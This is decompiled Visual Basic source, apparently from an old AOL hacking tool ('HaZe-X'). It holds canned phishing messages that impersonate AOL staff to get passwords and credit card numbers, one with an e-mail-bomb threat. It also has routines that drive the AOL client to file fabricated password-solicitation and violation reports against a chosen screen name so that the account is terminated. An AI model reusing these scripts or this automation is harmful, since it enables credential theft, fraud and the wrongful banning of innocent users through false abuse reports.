Text1 = "Hey bitch I have aoBomber and if you dont reply with your password I'll e-mail bomb you and kill your account ,that means you wont beable to come back on AOL again if i kill you!!So reply with your password now and your master screenname or I'll kill your account so fast you won't beable to come  on ever again!!!!"
ElseIf HScroll2.Value = 197 Then
Text1 = "Hello current AOL user,your current password JUMPED on your sign-on,we did not receive your password during sign-on,reply with your password within a desired limit to this instant message to keep your account on-line,if we should be forced to terminate your account do not panic.Just contact our AOL service department at 1-800-827-6364 to clear up the problem!Thank you for your time. :)"
ElseIf HScroll2.Value = 198 Then
Text1 = "Hello current user,we had a virus in are system today around 8:30 this morning,Random memory loses followed!We are going to have to ask for your billing info that you entered in when you signed up![Credit Card number,Address,Phone number,Zip code,State]To keep your account active,in case you do not reply with the information requested your account will be shut down,If this should happen,contact us at our 800#!Thank you for your cooperation! :-)"
ElseIf HScroll2.Value = 199 Then
Text1 = "Hello current user,this is Steve Case and Upper Chairman of this beautiful on-line service!We were wondering what would members like to recieve from this service rather then organized chat,on-line guides,we came up with free hours,all you have to do is reply with the phrase [Steve free] and your current screen name and password,of the  account that you want to be credited with 5 free hours,thats it!We take care of the rest!  :)     Thank you for your time     :SC ,Upper Board.[to be used and recorded for 1 time use]."
ElseIf HScroll2.Value = 200 Then
Text1 = "Hello,I am with the AOL billing Dept.!We have lost your account information.This is an emergency.It is required that you respond immedietaly or face account termination.Ignore the red message below stating [never give out your password] this is no scam.AOL corp."
End If
End Sub

Sub im1_Click ()
Dim l0854 As Variant
Dim l0858 As Variant
Dim l085C As Variant
Dim l0860 As String
Dim l0862 As Variant
Dim l0866() As Integer
Dim l086C As Integer
Dim l086E As Variant
Dim l0872 As Variant
Dim l0876 As String
Dim l0878 As Variant
Dim l087C As Variant
Dim l0880 As Variant
Dim l0884 As Variant
Dim l0888 As Variant
Dim l088C As Variant
Dim l0890 As Variant
Dim l0894 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0854 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0858 = 6
    l085C = Int(Rnd * l0858 + 1)
      If  l085C = 1 Then l0860$ = "" & Form1.Room & " asked for my password."
      If  l085C = 2 Then l0860$ = "" & Form1.Room & " tried to hack my password."
      If  l085C = 3 Then l0860$ = "Read!" & Form1.Room & " asked for my password."
      If  l085C = 4 Then l0860$ = "Please do something about " & Form1.Room & "."
      If  l085C = 5 Then l0860$ = "This guy wants my password:" & Form1.Room
      If  l085C = 6 Then l0860$ = "Please help " & Form1.Room & " wants my password."
      If  l085C = 7 Then l0860$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0862) Like "*KaOS*" Or UCase$(l0862) Like "*NiPP*" Or UCase$(l0862) Like "*CHOP*" Or UCase$(l0862) Like "*LoRe*" Or UCase$(l0862) Like "*CouNT*" Or UCase$(l0862) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOS IM1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l086C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l086E = extfn24E0(l086C%, "Compose Mail")
DoEvents
Loop Until l086E <> 0
l0872 = fn5D0(l0866(), l086E, "*", "_AOL_Edit", Null)
subF00 l0866(1), "TOS IM1"
subF00 l0866(3), "" & l0860$
l0876$ = Chr(10) + Chr(3)
subF00 l0866(4), "" & Room & ":" & " " & "" & Text1 & l0876$ & l0876$
l0878 = extfn24E0(l086E, "Send")
l087C = extfn2518(l086E, "_AOL_Icon")
l0880 = extfn13D0(l087C, 2)
l0884 = extfn13D0(l0880, 2)
l0888 = extfn1750(l087C, c0074, 0, 0&)
l088C = extfn1750(l087C, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0890 = 0 To Form1.Combo1.ListCount
l0894$ = Form1.Combo1.List(l0890)
If  Room = l0894$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub imv_Click ()
Dim l0896 As Variant
Dim l089A As Variant
Dim l089E As Variant
Dim l08A2 As String
Dim l08A4 As Variant
Dim l08A8 As Integer
Dim l08AA As Variant
Dim l08AE As Variant
Dim l08B2 As Variant
Dim l08B6 As Variant
Dim l08BA As Variant
Dim l08BE As Variant
Dim l08C2 As Variant
Dim l08C6 As Variant
Dim l08CA As Variant
Dim l08CE As Variant
Dim l08D2 As Variant
Dim l08D6 As Variant
Dim l08DA As Integer
Dim l08DC As Integer
Dim l08DE As Variant
Dim l08E2 As Variant
Dim l08E6 As Variant
Dim l08EA As Variant
Dim l08EE As Variant
Dim l08F2 As Variant
Dim l08F6 As Variant
Dim l08FA As Variant
Dim l08FE As Variant
Dim l0902 As Variant
Dim l0906 As Variant
Dim l090A As Variant
Dim l090E As Variant
Dim l0912 As String
Dim l0914 As Variant
Dim l0918 As Variant
Dim l091C As Variant
Dim l0920 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0896 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l089A = 6
    l089E = Int(Rnd * l089A + 1)
      If  l089E = 1 Then l08A2$ = "17"
      If  l089E = 2 Then l08A2$ = "2"
      If  l089E = 3 Then l08A2$ = "72"
      If  l089E = 4 Then l08A2$ = "53"
      If  l089E = 5 Then l08A2$ = "45"
      If  l089E = 6 Then l08A2$ = "11"
      If  l089E = 7 Then l08A2$ = "65"
      Next
If  UCase$(l08A4) Like "*KaOS*" Or UCase$(l08A4) Like "*NiPP*" Or UCase$(l08A4) Like "*CHOP*" Or UCase$(l08A4) Like "*LoRe*" Or UCase$(l08A4) Like "*CouNT*" Or UCase$(l08A4) Like "*SoSo*" Or UCase$(l08A4) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • IM Violation"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
Call subD08("Keyword...", "&Go To")
l08A8% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l08AA = extfn24E0(l08A8%, "Keyword")
Loop Until l08AA <> 0
l08AE = extfn2518(l08AA, "_AOL_Edit")
l08B2 = extfn1718(l08AE, c07E6, 0, "Guidepager")
l08B6 = extfn16E0(l08AE, c0218, 13, 0)
Do
DoEvents
l08BA = extfn24E0(l08A8%, "I Need Help!")
Loop Until l08BA <> 0
l08BE = extfn2518(l08BA, "_AOL_Icon")
l08C2 = extfn13D0(l08BE, 2)
l08C6 = extfn13D0(l08C2, 2)
l08CA = extfn13D0(l08C6, 2)
l08CE = extfn13D0(l08CA, 2)
l08D2 = extfn1750(l08C6, c0074, 0, 0&)
l08D6 = extfn1750(l08C6, c007C, 0, 0&)
subF38 .1#
l08DC% = extfn24E0(l08DA%, "I Need Help!")
Do
DoEvents
l08DE = extfn24E0(l08A8%, "Report A Violation")
Loop Until l08DE <> 0
l08E2 = extfn2518(10634, "_AOL_Icon")
SendKeys "{tab}" & " "
l08E6 = extfn16E0(l08DC%, c022E, 0, 0)
l08EA = extfn16E0(10634, c022E, 0, 0)
Do
DoEvents
l08EE = extfn24E0(l08A8%, "Violations via instant Messages")
Loop Until l08EE <> 0
subF38 .1#
l08DC% = extfn24E0(l08DA%, "Report A Violation")
l08E6 = extfn16E0(l08DC%, c022E, 0, 0)
l08AE = extfn2518(l08EE, "_AOL_Edit")
l08F2 = extfn13D0(l08AE, 2)
l08F6 = extfn13D0(l08F2, 2)
l08FA = extfn13D0(l08F6, 2)
l08FE = extfn13D0(l08FA, 2)
l0902 = extfn13D0(l08FE, 2)
l0906 = extfn13D0(l0902, 2)
l090A = extfn13D0(l0906, 2)
l090E = extfn13D0(l090A, 2)
l08B2 = extfn1718(l08AE, c07E6, 0, Date)
l08B2 = extfn1718(l08F6, c07E6, 0, Time)
l0912$ = Chr(10)
l08B2 = extfn1718(l08FE, c07E6, 0, Room + ":" & " " + Text1 & l0912$)
subF38 .3#
l0914 = extfn2518(l08EE, "_AOL_Button")
l08D2 = extfn1750(l0914, c0074, 0, 0&)
l08D6 = extfn1750(l0914, c007C, 0, 0&)
l0918 = extfn16E0(l08EE, c022E, 0, 0)
l0918 = extfn16E0(l08BA, c022E, 0, 0)
l0918 = extfn16E0(l08DE, c022E, 0, 0)
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l091C = 0 To Combo1.ListCount
l0920$ = Combo1.List(l091C)
If  Room = l0920$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub irc_Click ()
Dim l0922 As Variant
Dim l0926 As Variant
Dim l092A As Variant
Dim l092E As String
Dim l0930 As Variant
Dim l0934() As Integer
Dim l093A As Integer
Dim l093C As Variant
Dim l0940 As Variant
Dim l0944 As String
Dim l0946 As Variant
Dim l094A As Variant
Dim l094E As Variant
Dim l0952 As Variant
Dim l0956 As Variant
Dim l095A As Variant
Dim l095E As Variant
Dim l0962 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0922 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0926 = 6
    l092A = Int(Rnd * l0926 + 1)
      If  l092A = 1 Then l092E$ = "" & Form1.Room & " asked for my password."
      If  l092A = 2 Then l092E$ = "" & Form1.Room & " tried to hack my password."
      If  l092A = 3 Then l092E$ = "Read!" & Form1.Room & " asked for my password."
      If  l092A = 4 Then l092E$ = "Please do something about " & Form1.Room & "."
      If  l092A = 5 Then l092E$ = "This guy wants my password:" & Form1.Room
      If  l092A = 6 Then l092E$ = "Please help " & Form1.Room & " wants my password."
      If  l092A = 7 Then l092E$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0930) Like "*KaOS*" Or UCase$(l0930) Like "*NiPP*" Or UCase$(l0930) Like "*CHOP*" Or UCase$(l0930) Like "*LoRe*" Or UCase$(l0930) Like "*CouNT*" Or UCase$(l0930) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSIRC"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l093A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l093C = extfn24E0(l093A%, "Compose Mail")
DoEvents
Loop Until l093C <> 0
l0940 = fn5D0(l0934(), l093C, "*", "_AOL_Edit", Null)
subF00 l0934(1), "TOSIRC"
subF00 l0934(3), "" & l092E$
l0944$ = Chr(10) + Chr(3)
subF00 l0934(4), "" & Room & ":" & " " & "" & Text1 & l0944$ & l0944$
l0946 = extfn24E0(l093C, "Send")
l094A = extfn2518(l093C, "_AOL_Icon")
l094E = extfn13D0(l094A, 2)
l0952 = extfn13D0(l094E, 2)
l0956 = extfn1750(l094A, c0074, 0, 0&)
l095A = extfn1750(l094A, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l095E = 0 To Combo1.ListCount
l0962$ = Combo1.List(l095E)
If  Room = l0962$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub Kaos_Click ()
Dim l0964 As String
Dim l0966() As Integer
Dim l096C As Integer
Dim l096E As Variant
Dim l0972 As Variant
Dim l0976 As Variant
Dim l097A As Variant
Dim l097E As Integer
Dim l0980 As Variant
Dim l0984 As Integer
Dim l0986 As Variant
Dim l098A As Integer
Dim l098C As Variant
Dim l0990 As Variant
Dim l0994 As Variant
Dim l0998 As Variant
Dim l099C As Variant
Dim l09A0 As Variant
Dim l09A4 As Variant
Dim l09A8 As Variant
Dim l09AC As Variant
Dim l09B0 As Variant
Dim l09B4 As Variant
Dim l09B8 As Variant
Dim l09BC As Variant
Dim l09C0 As Integer
Dim l09C2 As Variant
Dim l09C6 As Variant
Dim l09CA As Variant
Dim l09CE As Variant
Dim l09D2 As Variant
Dim l09D6 As String
Dim l09D8 As Integer
Dim l09DA As Variant
Dim l09DE As Variant
Dim l09E2 As Variant
Dim l09E6 As Variant
Dim l09EA As Variant
Dim l09EE As Variant
Dim l09F2 As Variant
Dim l09F6 As Variant
Dim l09FA As Variant
Dim l09FE As Variant
Dim l0A02 As Variant
Dim l0A06 As Variant
Dim l0A0A As Variant
Dim l0A0E As Variant
Dim l0A12 As Variant
Dim l0A16 As Variant
Dim l0A1A As Variant
Dim l0A1E As Variant
Dim l0A22 As Variant
Dim l0A26 As Variant
Dim l0A2A As Variant
Dim l0A2E As Variant
Dim l0A32 As Variant
Dim l0A36 As Variant
Dim l0A3A As Variant
Dim l0A3E As Variant
Dim l0A42 As Variant
Dim l0A46 As Variant
Dim l0A4A As String
Dim l0A4C As Variant
Dim l0A50 As Variant
Dim l0A54 As Variant
Dim l0A58 As Variant
Dim l0A5C As Variant
Dim l0A60 As Variant
Dim l0A64 As Variant
Dim l0A68 As Variant
Dim l0A6C As Variant
Dim l0A70 As Variant
Dim l0A74 As Variant
Dim l0A78 As Variant
Dim l0A7C As Variant
Dim l0A80 As Variant
Dim l0A84 As Variant
Dim l0A88 As Variant
Dim l0A8C As Integer
Dim l0A8E As Integer
Dim l0A90 As Variant
Dim l0A94 As Variant
Dim l0A98 As Variant
Dim l0A9C As Integer
Dim l0A9E As Integer
Dim l0AA0 As Integer
Dim l0AA2 As Variant
Dim l0AA6 As String
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Multi Killer"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
l096C% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l096E = extfn24E0(l096C%, "Keyword")
Loop Until l096E <> 0
l0972 = extfn2518(l096E, "_AOL_Edit")
l0976 = extfn1718(l0972, c07E6, 0, "GUIDEPAGER")
l097A = extfn16E0(l0972, c0218, 13, 0)
Do
DoEvents
l097E% = extfn1520("AOL Frame25", 0&)
l0980 = extfn24E0(l097E%, "I Need Help!")
Loop Until l0980 > 0
l0984% = extfn2518(l0980, "_AOL_ICON")
l0986 = extfn1750(l0984%, c0074, 0, 0)
l0986 = extfn1750(l0984%, c007C, 0, 0)
subF38 .1#
l098A% = extfn24E0(l096C%, "I Need Help!")
l098C = extfn16E0(l098A%, c022E, 0, 0)
Do
DoEvents
l0990 = extfn24E0(l096C%, "Report Password Solicitations")
Loop Until l0990 <> 0
l0976 = extfn16E0(l0994, c022E, 0, 0)
l0998 = extfn2518(l096C%, "_AOL_Edit")
l099C = extfn14E8(l0998, c0810)
l09A0 = extfn14E8(l099C, c0810)
l09A4 = extfn14E8(l09A0, c0810)
l09A8 = extfn14E8(l09A4, c0810)
l09AC = extfn14E8(l09A8, c0810)
l09B0 = extfn14E8(l09AC, c0810)
l09B4 = extfn14E8(l09B0, c0810)
l09B8 = extfn14E8(l09B4, c0810)
l09BC = extfn1718(l09B0, c07E6, 0, Room)
l0964$ = Chr(10)
l09BC = extfn1718(l09B8, c07E6, 0, Room + ":" & " " & "" & Text1 & l0964$ & l0964$)
subF38 .3#
l097A = extfn16E0(l09B0, c0218, 13, 0)
subF38 .5#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Guidepager Completed"
subF38 .2#
l096C% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l096E = extfn24E0(l096C%, "Keyword")
Loop Until l096E <> 0
l0972 = extfn2518(l096E, "_AOL_Edit")
l0976 = extfn1718(l0972, c07E6, 0, "KO HELP")
l097A = extfn16E0(l0972, c0218, 13, 0)
Do
DoEvents
l097E% = extfn1520("AOL Frame25", 0&)
l0980 = extfn24E0(l097E%, "I Need Help!")
Loop Until l0980 > 0
l0984% = extfn2518(l0980, "_AOL_ICON")
l0986 = extfn1750(l0984%, c0074, 0, 0)
l0986 = extfn1750(l0984%, c007C, 0, 0)
subF38 .1#
l098A% = extfn24E0(l096C%, "I Need Help!")
l098C = extfn16E0(l098A%, c022E, 0, 0)
Do
DoEvents
l09C0% = extfn24E0(l096C%, "Report Password Solicitations")
Loop Until l09C0% > 0
l09C6 = extfn16E0(l09C2, c022E, 0, 0)
l0998 = extfn2518(l096C%, "_AOL_edit")
l099C = extfn14E8(l0998, c0810)
l09A0 = extfn14E8(l099C, c0810)
l09A4 = extfn14E8(l09A0, c0810)
l09A8 = extfn14E8(l09A4, c0810)
l09AC = extfn14E8(l09A8, c0810)
l09B0 = extfn14E8(l09AC, c0810)
l09B4 = extfn14E8(l09B0, c0810)
l09B8 = extfn14E8(l09B4, c0810)
l098C = extfn1718(l09A8, c07E6, 0, Room)
l098C = extfn1718(l09B0, c07E6, 0, Room + ":" & " " & "" & Text1 & Chr(10))
subF38 .3#
l097A = extfn16E0(l09B4, c0218, 13, 0)
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • New KO Help Completed"
subF38 .2#
Randomize
For l09CA = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l09CE = 6
    l09D2 = Int(Rnd * l09CE + 1)
      If  l09D2 = 1 Then l09D6$ = "17"
      If  l09D2 = 2 Then l09D6$ = "2"
      If  l09D2 = 3 Then l09D6$ = "72"
      If  l09D2 = 4 Then l09D6$ = "53"
      If  l09D2 = 5 Then l09D6$ = "45"
      If  l09D2 = 6 Then l09D6$ = "11"
      If  l09D2 = 7 Then l09D6$ = "65"
      Next
Call subD08("Keyword...", "&Go To")
l09D8% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l09DA = extfn24E0(l09D8%, "Keyword")
Loop Until l09DA <> 0
l09DE = extfn2518(l09DA, "_AOL_Edit")
l09E2 = extfn1718(l09DE, c07E6, 0, "Guidepager")
l09E6 = extfn16E0(l09DE, c0218, 13, 0)
Do
DoEvents
l09EA = extfn24E0(l09D8%, "I Need Help!")
Loop Until l09EA <> 0
l09EE = extfn2518(l09EA, "_AOL_Icon")
l09F2 = extfn13D0(l09EE, 2)
l09F6 = extfn13D0(l09F2, 2)
l09FA = extfn13D0(l09F6, 2)
l09FE = extfn13D0(l09FA, 2)
l0A02 = extfn1750(l09F6, c0074, 0, 0&)
l0A06 = extfn1750(l09F6, c007C, 0, 0&)
subF38 .1#
l098A% = extfn24E0(l096C%, "I Need Help!")
Do
DoEvents
l0A0A = extfn24E0(l09D8%, "Report A Violation")
Loop Until l0A0A <> 0
l0A0E = extfn2518(10634, "_AOL_Icon")
SendKeys "{tab}" & " "
l098C = extfn16E0(l098A%, c022E, 0, 0)
l0A12 = extfn16E0(10634, c022E, 0, 0)
Do
DoEvents
l0A16 = extfn24E0(l09D8%, "Violations via instant Messages")
Loop Until l0A16 <> 0
subF38 .1#
l098A% = extfn24E0(l096C%, "Report A Violation")
l098C = extfn16E0(l098A%, c022E, 0, 0)
l09DE = extfn2518(l0A16, "_AOL_Edit")
l0A1A = extfn13D0(l09DE, 2)
l0A1E = extfn13D0(l0A1A, 2)
l0A22 = extfn13D0(l0A1E, 2)
l0A26 = extfn13D0(l0A22, 2)
l0A2A = extfn13D0(l0A26, 2)
l0A2E = extfn13D0(l0A2A, 2)
l0A32 = extfn13D0(l0A2E, 2)
l0A36 = extfn13D0(l0A32, 2)
l09E2 = extfn1718(l09DE, c07E6, 0, Date)
l09E2 = extfn1718(l0A1E, c07E6, 0, Time)
l09E2 = extfn1718(l0A26, c07E6, 0, Room + ":" & " " + Text1 & Chr(10))
subF38 .3#
l0A3A = extfn2518(l0A16, "_AOL_Button")
l0A02 = extfn1750(l0A3A, c0074, 0, 0&)
l0A06 = extfn1750(l0A3A, c007C, 0, 0&)
l0A3E = extfn16E0(l0A16, c022E, 0, 0)
l0A3E = extfn16E0(l09EA, c022E, 0, 0)
l0A3E = extfn16E0(l0A0A, c022E, 0, 0)
sub30B0 "•-^v•HaZe-X²·³ [gold] • IM Violation Complete"
subF38 .2#
Randomize
For l09CA = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0A42 = 6
    l0A46 = Int(Rnd * l0A42 + 1)
      If  l0A46 = 1 Then l0A4A$ = "" & Form1.Room & " asked for my password."
      If  l0A46 = 2 Then l0A4A$ = "" & Form1.Room & " tried to hack my password."
      If  l0A46 = 3 Then l0A4A$ = "Read!" & Form1.Room & " asked for my password."
      If  l0A46 = 4 Then l0A4A$ = "Please do something about " & Form1.Room & "."
      If  l0A46 = 5 Then l0A4A$ = "This guy wants my password:" & Form1.Room
      If  l0A46 = 6 Then l0A4A$ = "Please help " & Form1.Room & " wants my password."
      If  l0A46 = 7 Then l0A4A$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0A4C) Like "*KaOS*" Or UCase$(l0A4C) Like "*NiPP*" Or UCase$(l0A4C) Like "*CHOP*" Or UCase$(l0A4C) Like "*LoRe*" Or UCase$(l0A4C) Like "*CouNT*" Or UCase$(l0A4C) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
l096C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0A50 = extfn24E0(l096C%, "Compose Mail")
DoEvents
Loop Until l0A50 <> 0
l0A54 = fn5D0(l0966(), l0A50, "*", "_AOL_Edit", Null)
subF00 l0966(1), "TOSEmail1"
subF00 l0966(3), "" & l0A4A$
l0964$ = Chr(10)
subF00 l0966(4), "" & Room & ":" & " " & "" & Text1 & l0964$ & l0964$
l0A58 = extfn24E0(l0A50, "Send")
l0A5C = extfn2518(l0A50, "_AOL_Icon")
l0A60 = extfn13D0(l0A5C, 2)
l0A64 = extfn13D0(l0A60, 2)
l0A68 = extfn1750(l0A5C, c0074, 0, 0&)
l0A6C = extfn1750(l0A5C, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail1 Completed."
subF38 .3#
l096C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0A50 = extfn24E0(l096C%, "Compose Mail")
DoEvents
Loop Until l0A50 <> 0
l0A54 = fn5D0(l0966(), l0A50, "*", "_AOL_Edit", Null)
subF00 l0966(1), "TOSEmail2"
subF00 l0966(3), "" & l0A4A$
l0964$ = Chr(10)
subF00 l0966(4), "" & Room & ":" & " " & "" & Text1 & l0964$ & l0964$
l0A58 = extfn24E0(l0A50, "Send")
l0A5C = extfn2518(l0A50, "_AOL_Icon")
l0A60 = extfn13D0(l0A5C, 2)
l0A64 = extfn13D0(l0A60, 2)
l0A68 = extfn1750(l0A5C, c0074, 0, 0&)
l0A6C = extfn1750(l0A5C, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail2 Completed."
subF38 .3#
l096C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0A50 = extfn24E0(l096C%, "Compose Mail")
DoEvents
Loop Until l0A50 <> 0
l0A54 = fn5D0(l0966(), l0A50, "*", "_AOL_Edit", Null)
subF00 l0966(1), "TOSEmail3"
subF00 l0966(3), "" & l0A4A$
l0964$ = Chr(10)
subF00 l0966(4), "" & Room & ":" & " " & "" & Text1 & l0964$ & l0964$
l0A58 = extfn24E0(l0A50, "Send")
l0A5C = extfn2518(l0A50, "_AOL_Icon")
l0A60 = extfn13D0(l0A5C, 2)
l0A64 = extfn13D0(l0A60, 2)
l0A68 = extfn1750(l0A5C, c0074, 0, 0&)
l0A6C = extfn1750(l0A5C, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail3 Completed."
subF38 .3#
l096C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0A50 = extfn24E0(l096C%, "Compose Mail")
DoEvents
Loop Until l0A50 <> 0
l0A54 = fn5D0(l0966(), l0A50, "*", "_AOL_Edit", Null)
subF00 l0966(1), "TOS IM1"
subF00 l0966(3), "" & l0A4A$
l0964$ = Chr(10)
subF00 l0966(4), "" & Room & ":" & " " & "" & Text1 & l0964$ & l0964$
l0A58 = extfn24E0(l0A50, "Send")
l0A5C = extfn2518(l0A50, "_AOL_Icon")
l0A60 = extfn13D0(l0A5C, 2)
l0A64 = extfn13D0(l0A60, 2)
l0A68 = extfn1750(l0A5C, c0074, 0, 0&)
l0A6C = extfn1750(l0A5C, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOS IM1 Completed."
subF38 .3#
l096C% = extfn1520("AOL Frame25", 0&)
l0986 = extfn1520("AOL Frame25", 0&)
Call subD08("INVOKE DATABASE RECORD", "*")
Do
DoEvents
l0A70 = extfn24E0(l0986, "INVOKE DATABASE RECORD")
DoEvents
Loop Until l0A70 <> 0
l0A74 = extfn2518(l0A70, "_AOL_Icon")
l0A5C = extfn2518(l0A70, "_AOL_Edit")
l0A78 = extfn1718(l0A5C, c07E6, 0, "40-22620")
subF38 .3#
l0A7C = extfn24E0(l096C%, "Invoke Database Record")
l0A80 = extfn2518(l0A7C, "_AOL_Button")
l0A84 = extfn24E0(l0A80, "OK")
subF38 .5#
l0A88 = extfn1750(l0A80, c0074, 0, 0&)
l0A88 = extfn1750(l0A80, c007C, 0, 0&)
subF38 .1#
l0A8C% = extfn24E0(l096C%, "INVOKE DATABASE RECORD")
l098C = extfn1750(l0A8C%, c022E, 0, 0)
subF38 .9#
Do
DoEvents
l0A8E% = extfn24E0(l096C%, "GUIDEPAGER FOR STAFF MEMBERS")
Loop Until l0A8E% > 0
l0A90 = extfn24E0(l096C%, "guidepager for staff members")
l0A94 = fn5D0(l0966(), l0A90, "*", "_AOL_Icon", Null)
l0A98 = l0966(3)
l0A68 = extfn1750(l0A98, c0074, 0, 0&)
l0A6C = extfn1750(l0A98, c007C, 0, 0&)
subF38 .1#
l098A% = extfn24E0(l096C%, "GUIDEPAGER FOR STAFF MEMBERS")
l098C = extfn1750(l098A%, c022E, 0, 0)
DoEvents
l0A9E% = extfn1750(l0A9C%, c0074, 0, 0&)
l0A9E% = extfn1750(l0A9C%, c007C, 0, 0&)
subF38 .1#
Do
DoEvents
l0AA0% = extfn24E0(l096C%, "Report Password Solicitations")
Loop Until l0AA0% > 0
subF38 .1#
l098A% = extfn24E0(l096C%, "GUIDEPAGER FOR STAFF MEMBERS")
l098C = extfn1750(l098A%, c022E, 0, 0)
l0998 = extfn2518(l096C%, "_AOL_edit")
l099C = extfn14E8(l0998, c0810)
l09A0 = extfn14E8(l099C, c0810)
l09A4 = extfn14E8(l09A0, c0810)
l09A8 = extfn14E8(l09A4, c0810)
l09AC = extfn14E8(l09A8, c0810)
l09B0 = extfn14E8(l09AC, c0810)
l09B4 = extfn14E8(l09B0, c0810)
l09B8 = extfn14E8(l09B4, c0810)
l09BC = extfn1718(l09B0, c07E6, 0, Room)
l0964$ = Chr(10)
l09BC = extfn1718(l09B8, c07E6, 0, Room + ":" & " " & "" & Text1 & l0964$ & l0964$)
subF38 .3#
l097A = extfn16E0(l09B0, c0218, 13, 0)
subF38 .7#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Staffpager Completed."
subF38 .2#
sub30B0 "•-^v•HaZe-X²·³ [gold] • Multi Killer Completed."
Call sub3208
For l0AA2 = 0 To Combo1.ListCount
l0AA6$ = Combo1.List(l0AA2)
If  Room = l0AA6$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub kill_Click ()
Call subA30
End Sub

Sub koh_Click ()
Dim l0AA8 As Variant
Dim l0AAC As Integer
Dim l0AAE As Variant
Dim l0AB2 As Variant
Dim l0AB6 As Variant
Dim l0ABA As Variant
Dim l0ABE As Integer
Dim l0AC0 As Variant
Dim l0AC4 As Integer
Dim l0AC6 As Variant
Dim l0ACA As Integer
Dim l0ACC As Variant
Dim l0AD0 As Integer
Dim l0AD2 As Variant
Dim l0AD6 As Variant
Dim l0ADA As Variant
Dim l0ADE As Variant
Dim l0AE2 As Variant
Dim l0AE6 As Variant
Dim l0AEA As Variant
Dim l0AEE As Variant
Dim l0AF2 As Variant
Dim l0AF6 As Variant
Dim l0AFA As Variant
Dim l0AFE As String
Dim l0B00 As Variant
Dim l0B04 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
If  UCase$(l0AA8) Like "*KaOS*" Or UCase$(l0AA8) Like "*NiPP*" Or UCase$(l0AA8) Like "*CHOP*" Or UCase$(l0AA8) Like "*LoRe*" Or UCase$(l0AA8) Like "*CouNT*" Or UCase$(l0AA8) Like "*SoSo*" Or UCase$(l0AA8) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
